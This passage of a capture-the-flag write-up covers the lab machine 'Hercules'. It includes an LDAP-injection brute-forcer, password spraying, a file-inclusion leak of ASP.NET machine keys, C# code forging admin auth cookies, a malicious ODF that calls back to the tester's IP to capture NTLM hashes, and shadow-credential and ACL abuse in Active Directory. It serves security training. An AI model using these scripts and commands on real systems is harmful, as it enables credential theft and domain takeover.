+    group.add_argument(&quot;--user&quot;, &quot;-u&quot;, help=&quot;Single username to operate on&quot;)
+    group.add_argument(&quot;--wordlist&quot;, &quot;-w&quot;, help=&quot;File with usernames (one per line)&quot;)
+
+    parser.add_argument(&quot;--brute&quot;, metavar=&quot;FIELD&quot;, help=&quot;Brute-force the given field for username(s)&quot;)
+    parser.add_argument(&quot;--delay&quot;, type=float, default=0.05, help=&quot;Delay between character attempts (seconds)&quot;)
+    parser.add_argument(&quot;--max-length&quot;, type=int, default=50, help=&quot;Maximum length to extract for a field&quot;)
+    parser.add_argument(&quot;--insecure&quot;, action=&quot;store_true&quot;, help=&quot;Do not verify TLS certificates&quot;)
+    parser.add_argument(&quot;--out&quot;, &quot;-o&quot;, help=&quot;Optional JSON output file to store results&quot;)
+    args = parser.parse_args()
+
+    global VERIFY_TLS
+    if args.insecure:
+        VERIFY_TLS = False
+
+    targets = []
+    if args.user:
+        targets = [args.user]
+    else:
+        targets = load_usernames(args.wordlist)
+
+    results = []
+    for user in targets:
+        entry = {&quot;username&quot;: user}
+        try:
+            if args.brute:
+                discovered = brute_field_for_user(
+                    user,
+                    field=args.brute,
+                    charset=DEFAULT_CHARSET,
+                    max_length=args.max_length,
+                    delay=args.delay,
+                )
+                entry[&quot;brute&quot;] = discovered
+                if discovered:
+                    print(f&quot;{Fore.GREEN}[+] {user}::{args.brute} = {discovered}{Style.RESET_ALL}&quot;)
+                else:
+                    print(f&quot;{Fore.RED}[-] No field value found for object {user}{Style.RESET_ALL}&quot;)
+            else:
+                is_valid = validate_user(user)
+                entry[&quot;valid&quot;] = bool(is_valid)
+                if is_valid:
+                    print(f&quot;{Fore.GREEN}[+] {user}{Style.RESET_ALL}&quot;)
+                else:
+                    print(f&quot;{Fore.RED}[-] {user}{Style.RESET_ALL}&quot;)
+
+        except Exception as e:
+            entry[&quot;error&quot;] = str(e)
+            print(f&quot;[!] Error for {user}: {e}&quot;)
+
+        results.append(entry)
+
+    if args.out:
+        with open(args.out, &quot;w&quot;, encoding=&quot;utf-8&quot;) as fh:
+            json.dump(results, fh, indent=2)
+
+    print(&quot;[*] Done.&quot;)
+
+if __name__ == &quot;__main__&quot;:
+    main()</code></pre>
+</doc-codeblock></div>
+<p>The server returns different error messages based on the result of the filter. In case the response contains <code translate="no" v-pre>Login attempt failed</code>, the filter returned a match. The most interesting fields to check are the description, because it might contains a password. With the above script we can enumerate the usernames and check if they have a description field.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python ldap_inject.py -w users.txt --brute description
+[-] No field value found for object administrator
+[-] No field value found for object admin
+[-] No field value found for object adriana.i
+[-] No field value found for object angelo.o
+[-] No field value found for object ashley.b
+[-] No field value found for object auditor
+[-] No field value found for object bob.w
+[-] No field value found for object camilla.b
+[-] No field value found for object clarissa.c
+[-] No field value found for object elijah.m
+[-] No field value found for object fiona.c
+[-] No field value found for object harris.d
+[-] No field value found for object heather.s
+[-] No field value found for object jacob.b
+[-] No field value found for object jennifer.a
+[-] No field value found for object jessica.e
+[-] No field value found for object joel.c
+[-] No field value found for object johanna.f
+[*] Found possible value on description for object johnathan.j
+change*th1s_p@ssw()rd!!
+[+] johnathan.j::description = change*th1s_p@ssw()rd!!
+[-] No field value found for object ken.w
+[-] No field value found for object mark.s
+[-] No field value found for object mikayla.a
+[-] No field value found for object natalie.a
+[-] No field value found for object nate.h
+[-] No field value found for object patrick.s
+[-] No field value found for object ramona.l
+[-] No field value found for object ray.n
+[-] No field value found for object rene.s
+[-] No field value found for object shae.j
+[-] No field value found for object stephanie.w
+[-] No field value found for object stephen.m
+[-] No field value found for object tanya.r
+[-] No field value found for object tish.c
+[-] No field value found for object vincent.g
+[-] No field value found for object will.s
+[-] No field value found for object zeke.s
+[*] Done.</code></pre>
+</doc-codeblock></div>
+<p>After running the script, a potential password was found for the user <code translate="no" v-pre>johnathan.j</code> in his description field. However, when we check which users are able to login to the website, we see that <code translate="no" v-pre>johnathan.j</code> cannot login with this password. Naturally, we start password spraying on the other accounts we found.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc smb dc.hercules.htb -u users.txt -p 'change*th1s_p@ssw()rd!!' -d hercules.htb -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False)
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\administrator:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\admin:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\adriana.i:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\angelo.o:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\ashley.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\auditor:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\bob.w:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\camilla.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\clarissa.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\elijah.m:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\fiona.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\harris.d:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\heather.s:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jacob.b:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jennifer.a:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\jessica.e:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\joel.c:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\johanna.f:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [-] hercules.htb\johnathan.j:change*th1s_p@ssw()rd!! KDC_ERR_PREAUTH_FAILED
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\ken.w:change*th1s_p@ssw()rd!!</code></pre>
+</doc-codeblock></div>
+<p>We get a hit for <code translate="no" v-pre>ken.w</code> and can login via the Hercules portal.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-backend.png" alt="Hercules Portal" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1917" height="933" />
+    <figcaption class="caption">Hercules Portal</figcaption>
+</figure>
+<p>Looking through our messages, we see that the message <code translate="no" v-pre>Site Maintenance</code> also contains another user called <code translate="no" v-pre>web_admin</code> and a reference to <code translate="no" v-pre>natalie.a</code>. This is a hint towards our next steps.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-backend-message.png" alt="Portal Message" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1906" height="930" />
+    <figcaption class="caption">Portal Message</figcaption>
+</figure>
+<p>There is a <code translate="no" v-pre>Report Submission</code> feature that looks interesting, but apparently we don&#x27;t have the right to upload any files, so no phishing just yet.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-backend-upload-error.png" alt="Upload error" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1911" height="945" />
+    <figcaption class="caption">Upload error</figcaption>
+</figure>
+<p>Another features is to download files from the webserver.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/hercules-backend-download.png" alt="Download Form" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1920" height="950" />
+    <figcaption class="caption">Download Form</figcaption>
+</figure>
+<p>The download function is vulnerable to LFI and after fuzzing for some files we get a hit for <code translate="no" v-pre>/Home/Download?fileName=../../web.config</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ ffuf -request download.req -w $SECLISTS/Discovery/Web-Content/common.txt -fs 485 -fc 500 -ic -c
+web.config              [Status: 200, Size: 4896, Words: 643, Lines: 94, Duration: 20ms]</code></pre>
+</doc-codeblock></div>
+<p>A snippet of the contents reveal a <code translate="no" v-pre>machineKey</code> which includes the <code translate="no" v-pre>decryptionKey</code> and <code translate="no" v-pre>validationKey</code> (AES + HMACSHA256). Having knowledge of these values allows us to forge/modify Forms Authentication cookies (and impersonate any user).</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-markup"><code v-pre class="language-markup">&lt;?xml version=&quot;1.0&quot; encoding=&quot;utf-8&quot;?&gt;
+&lt;configuration&gt;
+  &lt;system.web&gt;
+    &lt;compilation targetFramework=&quot;4.8&quot; /&gt;
+    &lt;authentication mode=&quot;Forms&quot;&gt;
+      &lt;forms protection=&quot;All&quot; loginUrl=&quot;/Login&quot; path=&quot;/&quot; /&gt;
+    &lt;/authentication&gt;
+    &lt;httpRuntime enableVersionHeader=&quot;false&quot; maxRequestLength=&quot;2048&quot; executionTimeout=&quot;3600&quot; /&gt;
+    &lt;machineKey decryption=&quot;AES&quot; decryptionKey=&quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot; validation=&quot;HMACSHA256&quot; validationKey=&quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot; /&gt;
+    &lt;customErrors mode=&quot;Off&quot; /&gt;
+  &lt;/system.web&gt;
+  
+  &lt;system.codedom&gt;
+    &lt;compilers&gt;
+      &lt;compiler language=&quot;c#;cs;csharp&quot; extension=&quot;.cs&quot; warningLevel=&quot;4&quot; compilerOptions=&quot;/langversion:default /nowarn:1659;1699;1701;612;618&quot; type=&quot;Microsoft.CodeDom.Providers.DotNetCompilerPlatform.CSharpCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; /&gt;
+      &lt;compiler language=&quot;vb;vbs;visualbasic;vbscript&quot; extension=&quot;.vb&quot; warningLevel=&quot;4&quot; compilerOptions=&quot;/langversion:default /nowarn:41008,40000,40008 /define:_MYTYPE=\&amp;quot;Web\&amp;quot; /optionInfer+&quot; type=&quot;Microsoft.CodeDom.Providers.DotNetCompilerPlatform.VBCodeProvider, Microsoft.CodeDom.Providers.DotNetCompilerPlatform, Version=4.1.0.0, Culture=neutral, PublicKeyToken=31bf3856ad364e35&quot; /&gt;
+    &lt;/compilers&gt;
+  &lt;/system.codedom&gt;
+&lt;/configuration&gt;
+&lt;!--ProjectGuid: 6648C4C4-2FF2-4FF1-9F3E-1A560E46AA52--&gt;</code></pre>
+</doc-codeblock></div>
+<p>With the decryption keys, we can first try to decrypt our own <code translate="no" v-pre>FormsAuthenticationTicket</code> and see how the ticket is structured. If we can modify the role of our user we might be able to forge a ticket with a privileged role that has access to more features like uploading files.</p>
+<p>For this part I will have to switch to my Windows VM and compile a small <code translate="no" v-pre>.NET Console Application</code>. You can also do this on Linux with the <code translate="no" v-pre>dotnet sdk</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-csharp"><code v-pre class="language-csharp">using System.Globalization;
+using AspNetCore.LegacyAuthCookieCompat;
+
+class Program
+{
+    static void PrintTicket(FormsAuthenticationTicket t)
+    {
+        Console.WriteLine(&quot;---- FormsAuthenticationTicket ----&quot;);
+        Console.WriteLine(&quot;Version     : &quot; + t.Version);
+        Console.WriteLine(&quot;Name        : &quot; + t.Name);
+        Console.WriteLine(&quot;IssueDate   : &quot; + t.IssueDate.ToString(&quot;o&quot;, CultureInfo.InvariantCulture));
+        Console.WriteLine(&quot;Expiration  : &quot; + t.Expiration.ToString(&quot;o&quot;, CultureInfo.InvariantCulture));
+        Console.WriteLine(&quot;IsPersistent: &quot; + t.IsPersistent);
+        Console.WriteLine(&quot;UserData    : &quot; + t.UserData);
+        Console.WriteLine(&quot;CookiePath  : &quot; + t.CookiePath);
+        Console.WriteLine(&quot;-----------------------------------&quot;);
+    }
+
+    static void Main(string[] args)
+    {
+        string cmd = args[0].ToLowerInvariant();
+
+        string validationKey = &quot;EBF9076B4E3026BE6E3AD58FB72FF9FAD5F7134B42AC73822C5F3EE159F20214B73A80016F9DDB56BD194C268870845F7A60B39DEF96B553A022F1BA56A18B80&quot;;
+        string decryptionKey = &quot;B26C371EA0A71FA5C3C9AB53A343E9B962CD947CD3EB5861EDAE4CCC6B019581&quot;;
+
+        int minutes = 60;
+
+        // create ticket
+        var now = DateTime.UtcNow;
+        var expiry = now.AddMinutes(minutes);
+        var ticket = new FormsAuthenticationTicket(
+            1,                      // version
+            &quot;web_admin&quot;,            // name
+            now,                    // issueDate
+            expiry,                 // expiration
+            false,                  // isPersistent
+            &quot;Web Administrators&quot;,   // userData
+            &quot;/&quot;
+        );
+
+        var encryptor = new LegacyFormsAuthenticationTicketEncryptor(decryptionKey, validationKey, ShaVersion.Sha256);
+
+        try
+        {
+            if (cmd == &quot;decode&quot;)
+            {
+                var decodedTicket = encryptor.DecryptCookie(args[1]);
+                PrintTicket(decodedTicket);
+            }
+            else if (cmd == &quot;gen&quot;)
+            {
+                
+                var encrypted_cookie = encryptor.Encrypt(ticket);
+                Console.WriteLine(&quot;[+] Encrypted cookie value (place in .ASPXAUTH):&quot;);
+                Console.WriteLine(encrypted_cookie);
+            }
+        }
+        catch (Exception ex)
+        {
+            Console.WriteLine(&quot;[!] Exception during encrypt: &quot; + ex);
+            Environment.Exit(5);
+        }
+    }
+}</code></pre>
+</doc-codeblock></div>
+<p>To compile the project, we also need to install <code translate="no" v-pre>AspNetCore.LegacyAuthCookieCompat</code> in our project directory.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; dotnet add package AspNetCore.LegacyAuthCookieCompat --version 2.0.5</code></pre>
+</doc-codeblock></div>
+<p>When decoding our own cookie we get the following information:</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; .\AuthConsole.exe decode 93E217AE4C0C030222E4FCDE6A8ECDA8FCE20301A658E0C718FC4BB75E1E342E84316B312918B13B7CAFF855F52ECFC1718047B9D38DC8EEB9DC82EC5FB74C04739FDF787D4BA826A9C6A8E597BD76E6DD1A51636B4E3AD6A72C06CE9AD00626803E0A655C192FBE6E1733C3D6FABDBF633A56F39366DF0C787DDD6FD31D0F6A753AB13432DBCF1CEA7311CB30EA2C19C6DF1066191C75F8B4D9AE82160415FE
+---- FormsAuthenticationTicket ----
+Version     : 1
+Name        : ken.w
+IssueDate   : 2025-10-21T16:26:26.6383918+02:00
+Expiration  : 2025-10-21T16:36:26.6383918+02:00
+IsPersistent: False
+UserData    : Web Users
+CookiePath  : /
+-----------------------------------</code></pre>
+</doc-codeblock></div>
+<p>It looks like <code translate="no" v-pre>ken.w</code> has the <code translate="no" v-pre>Web Users</code> role. This role does not have the permission to upload any files, so after changing our role to <code translate="no" v-pre>Web Administrators</code> (which is a pure guess at this point) we can generate the cookie. Next, we replace our current cookie with the forged one in our browser session via <code translate="no" v-pre>devtools</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">PS C:\&gt; .\AuthConsole.exe gen
+[+] Encrypted cookie value (place in .ASPXAUTH):
+E564F870BE6A8AA09DD2D8780E7739FD9212779828BC57940193DCCDB3CB056809DF188C0670160D6C958313AAAC2D235796761FF3A83F906A1D7490F190C356F3FA66D42A65E6236C0614589EB30F2B78272895F0F93CCBA5510774CFC0B04A6B2F2EBD807953394CF4747701FE8BB797D820495A8366075EC239426ED4AFFF8B9A5CD524E22EB5771FB26C803BBD2588A631ABFE2B6754EEA406778DE7B29098485C9532E8C04D88D605E2BF3BC44ECDAF2FFD44853F65711834A0698CC33A</code></pre>
+</doc-codeblock></div>
+<p>After some experimenting with the upload form, the only files we are allowed to upload are <code translate="no" v-pre>docx</code> and <code translate="no" v-pre>odt</code> files. We can try to create a malicious document that make a callback to our machine whenever a user opens the document. This allows us to capture hashes via <code translate="no" v-pre>Responder</code>. We will use <a href="https://github.com/lof1sec/Bad-ODF">Bad-ODF.py</a> to create our malicious document.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ python Bad-ODF.py
+    ____            __      ____  ____  ______
+   / __ )____ _____/ /     / __ \/ __ \/ ____/
+  / __  / __ `/ __  /_____/ / / / / / / /_
+ / /_/ / /_/ / /_/ /_____/ /_/ / /_/ / __/
+/_____/\__,_/\__,_/      \____/_____/_/
+
+
+Create a malicious ODF document help leak NetNTLM Creds
+
+By Richard Davy
+@rd_pentest
+www.secureyourit.co.uk
+
+Please enter IP of listener: 10.10.14.171</code></pre>
+</doc-codeblock></div>
+<p>We can then upload the generated <code translate="no" v-pre>bad.odf</code> and run Responder. After some time we get a hash for <code translate="no" v-pre>natalie.a</code>.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/responder-hash.png" alt="Responder NTLM Hash Capture" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1901" height="899" />
+    <figcaption class="caption">Responder NTLM Hash Capture</figcaption>
+</figure>
+<p>The hash can be cracked with <code translate="no" v-pre>hashcat</code> and we get the password <code translate="no" v-pre>Prettyprincess123!</code>.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ hashcat natalie.a.hash $ROCKYOU
+
+&lt;HASH&gt;:Prettyprincess123!
+
+$ nxc smb dc.hercules.htb -u 'natalie.a' -p 'Prettyprincess123!' -k
+SMB         dc.hercules.htb 445    dc               [*]  x64 (name:dc) (domain:hercules.htb) (signing:True) (SMBv1:False)
+SMB         dc.hercules.htb 445    dc               [+] hercules.htb\natalie.a:Prettyprincess123!</code></pre>
+</doc-codeblock></div>
+<h2 id="bloodhound-enumeration">BloodHound Enumeration</h2>
+<p>We collect AD data with BloodHound. Just upload all JSON files one by one (no zip), because one file gave an error. It also seems like RustHound is the only tool that gave good results on BloodHound CE.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">rusthound-ce --domain hercules.htb --name-server 10.129.131.250 -f dc.hercules.htb -k --zip</code></pre>
+</doc-codeblock></div>
+<p>We continue enumerating bloodhound and discover that Natalie has <code translate="no" v-pre>GenericWrite</code> over the <code translate="no" v-pre>WEB DEPARTMENT</code> OU and several users, of which <code translate="no" v-pre>bob.w</code> looks the most interesting. Bob is a member of the <code translate="no" v-pre>Recruitment Managers</code> and might have more access over other objects (that is not directly visible via BloodHound).</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-natalie.png" alt="BloodHound Path from Natalie" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1732" height="928" />
+    <figcaption class="caption">BloodHound Path from Natalie</figcaption>
+</figure>
+<p>The <code translate="no" v-pre>GenericWrite</code> permission allows writing to the <code translate="no" v-pre>msds-KeyCredentialLink</code> property which allows creating <code translate="no" v-pre>Shadow Credentials</code> on the object and authenticate as the principal using kerberos PKINIT (if ADCS is in place). We perform the <code translate="no" v-pre>Shadow Credential</code> attack to recover the NTLM hash of Bob.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/natalie.a:Prettyprincess123!
+$ export KRB5CCNAME=natalie.a.ccache
+$ certipy shadow auto -k -no-pass -account bob.w -dc-host dc.hercules.htb
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user 'bob.w'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '0e3c2b5b946e44d2884dba15fadadce5'
+[*] Adding Key Credential with device ID '0e3c2b5b946e44d2884dba15fadadce5' to the Key Credentials for 'bob.w'
+[*] Successfully added Key Credential with device ID '0e3c2b5b946e44d2884dba15fadadce5' to the Key Credentials for 'bob.w'
+[*] Authenticating as 'bob.w' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'bob.w@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'bob.w.ccache'
+[*] Wrote credential cache to 'bob.w.ccache'
+[*] Trying to retrieve NT hash for 'bob.w'
+[*] Restoring the old Key Credentials for 'bob.w'
+[*] Successfully restored the old Key Credentials for 'bob.w'
+[*] NT hash for 'bob.w': 8a65c74e8f0073babbfac6725c66cc3f</code></pre>
+</doc-codeblock></div>
+<p>Using <code translate="no" v-pre>BloodyAD</code> we can further enumerate objects we have <code translate="no" v-pre>WRITE</code> permission over.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/bob.w -hashes :8a65c74e8f0073babbfac6725c66cc3f
+$ export KRB5CCNAME=bob.w.ccache
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb get writable --detail
+
+&lt;SNIP
+
+distinguishedName: OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+user: CREATE_CHILD
+account: CREATE_CHILD
+&lt;SNIP&gt;
+
+distinguishedName: CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb
+name: WRITE
+cn: WRITE</code></pre>
+</doc-codeblock></div>
+<p>Bob is able to create new objects in several OUs (<code translate="no" v-pre>CREATE_CHILD</code>) and modify attributes of several users (<code translate="no" v-pre>WRITE</code> on <code translate="no" v-pre>name/cn</code>). The most interesting user is <code translate="no" v-pre>Stephen Miller</code> since he is part of the <code translate="no" v-pre>Security Department</code> OU and can reset several user&#x27;s password.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-stephen.png" alt="BloodHound Path from Stephen" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1620" height="839" />
+    <figcaption class="caption">BloodHound Path from Stephen</figcaption>
+</figure>
+<p>We leverage these permissions to move Stephen to the <code translate="no" v-pre>Web Department</code> OU and subsequently doing the same attack as before to retrieve his NTLM hash. We can only move an object if we have the <code translate="no" v-pre>CREATE_CHILD</code> over the <code translate="no" v-pre>Web Department</code> OU and the <code translate="no" v-pre>DELETE_CHILD</code> over the <code translate="no" v-pre>Security Department</code> OU and <code translate="no" v-pre>WRITE_PROPERTY</code> over the <code translate="no" v-pre>distinguisedName</code> of the user we want to move. This can be double-checked with some DACL checks.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ nxc ldap dc.hercules.htb --use-kcache -M whoami
+LDAP        dc.hercules.htb 389    DC               [*] None (name:DC) (domain:hercules.htb)
+LDAP        dc.hercules.htb 389    DC               [+] hercules.htb\bob.w from ccache 
+WHOAMI      dc.hercules.htb 389    DC               distinguishedName: CN=Bob Wood,OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb
+WHOAMI      dc.hercules.htb 389    DC               Member of: CN=Domain Employees,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
+WHOAMI      dc.hercules.htb 389    DC               Member of: CN=Recruitment Managers,OU=Domain Groups,OU=DCHERCULES,DC=hercules,DC=htb
+WHOAMI      dc.hercules.htb 389    DC               name: Bob Wood
+WHOAMI      dc.hercules.htb 389    DC               Enabled: Yes
+WHOAMI      dc.hercules.htb 389    DC               Password Never Expires: Yes
+WHOAMI      dc.hercules.htb 389    DC               Last logon: 134056120259379722
+WHOAMI      dc.hercules.htb 389    DC               pwdLastSet: 133777502881449895
+WHOAMI      dc.hercules.htb 389    DC               logonCount: 2
+WHOAMI      dc.hercules.htb 389    DC               sAMAccountName: bob.w
+
+$ nxc ldap dc.hercules.htb --use-kcache -M daclread -o TARGET_DN='OU=Web Department,OU=DCHERCULES,DC=hercules,DC=htb' PRINCIPAL=&quot;Recruitment Managers&quot;
+DACLREAD    dc.hercules.htb 389    DC               ACE[7] info                
+DACLREAD    dc.hercules.htb 389    DC                   Access mask               : DeleteChild, CreateChild (0x3)
+DACLREAD    dc.hercules.htb 389    DC                   Trustee (SID)             : Recruitment Managers (S-1-5-21-1889966460-2597381952-958560702-1106)
+
+$ nxc ldap dc.hercules.htb --use-kcache -M daclread -o TARGET_DN='OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb' PRINCIPAL=&quot;Recruitment Managers&quot;
+DACLREAD    dc.hercules.htb 389    DC               ACE[8] info                
+DACLREAD    dc.hercules.htb 389    DC                   Access mask               : DeleteChild, CreateChild (0x3)
+DACLREAD    dc.hercules.htb 389    DC                   Trustee (SID)             : Recruitment Managers (S-1-5-21-1889966460-2597381952-958560702-1106)
+</code></pre>
+</doc-codeblock></div>
+<p>We are part of the <code translate="no" v-pre>Recruitment Managers</code> group and see that it has the required permissions to move the object. Let&#x27;s now proceed to do the actual movement.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ powerview hercules.htb/bob.w@dc.hercules.htb -k --no-pass
+╭─LDAPS─[dc.hercules.htb]─[HERCULES\bob.w]
+╰─PV ❯ Set-DomainObjectDN -Identity stephen.m -DestinationDN 'OU=Web Department,OU=DCHercules,DC=hercules,DC=htb'
+[2025-10-21 18:11:32] [Set-DomainObject] Success! modified new dn for CN=Stephen Miller,OU=Security Department,OU=DCHERCULES,DC=hercules,DC=htb</code></pre>
+</doc-codeblock></div>
+<p>Now we can use <code translate="no" v-pre>natalie.a</code> to do get the NTLM hash of Stephen, because the <code translate="no" v-pre>GenericWrite</code> permissions are now inherited over to this object.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ KRB5CCNAME=natalie.a.ccache certipy shadow auto -k -no-pass -account stephen.m -dc-host dc.hercules.htb
+Certipy v5.0.3 - by Oliver Lyak (ly4k)
+
+[!] Target name (-target) not specified and Kerberos authentication is used. This might fail
+[*] Targeting user 'stephen.m'
+[*] Generating certificate
+[*] Certificate generated
+[*] Generating Key Credential
+[*] Key Credential generated with DeviceID '7d40774686f8488c9238fc67d0464405'
+[*] Adding Key Credential with device ID '7d40774686f8488c9238fc67d0464405' to the Key Credentials for 'stephen.m'
+[*] Successfully added Key Credential with device ID '7d40774686f8488c9238fc67d0464405' to the Key Credentials for 'stephen.m'
+[*] Authenticating as 'stephen.m' with the certificate
+[*] Certificate identities:
+[*]     No identities found in this certificate
+[*] Using principal: 'stephen.m@hercules.htb'
+[*] Trying to get TGT...
+[*] Got TGT
+[*] Saving credential cache to 'stephen.m.ccache'
+[*] Wrote credential cache to 'stephen.m.ccache'
+[*] Trying to retrieve NT hash for 'stephen.m'
+[*] Restoring the old Key Credentials for 'stephen.m'
+[*] Successfully restored the old Key Credentials for 'stephen.m'
+[*] NT hash for 'stephen.m': 9aaaedcb19e612216a2dac9badb3c210</code></pre>
+</doc-codeblock></div>
+<p>The <code translate="no" v-pre>auditor</code> user seems like the next step as this user is both part of the <code translate="no" v-pre>Remote Management Users</code> and <code translate="no" v-pre>Forest Management</code> group.</p>
+<figure class="content-center">
+    <img src="../../../../assets/images/writeups/hercules/bloodhound-auditor.png" alt="BloodHound Auditor Membership" class="max-w-full h-auto rounded-image-rounded border-image-border border-image-border-width" width="1498" height="395" />
+    <figcaption class="caption">BloodHound Auditor Membership</figcaption>
+</figure>
+<p>We reset the account with <code translate="no" v-pre>BloodyAD</code> since we have the <code translate="no" v-pre>ForceChangePassword</code> permission.</p>
+<div class="codeblock-wrapper"><doc-codeblock>
+<pre translate="no" class="language-shell-session"><code v-pre class="language-shell-session">$ getTGT.py hercules.htb/stephen.m -hashes :9aaaedcb19e612216a2dac9badb3c210
+$ export KRB5CCNAME=stephen.m.ccache
+$ bloodyAD -k -d hercules.htb --host dc.hercules.htb set password auditor 'Pwn3d_by_ACLs!'
+
+$ getTGT.py hercules.htb/auditor:Pwn3d_by_ACLs!
+$ export KRB5CCNAME=auditor.ccache
+
+$ evil-winrm-py -k -i dc.hercules.htb --ssl
+
+evil-winrm-py PS C:\Users\auditor\desktop&gt; cat user.txt
+6e001f4f622c290c03e287f89f51a972</code></pre>
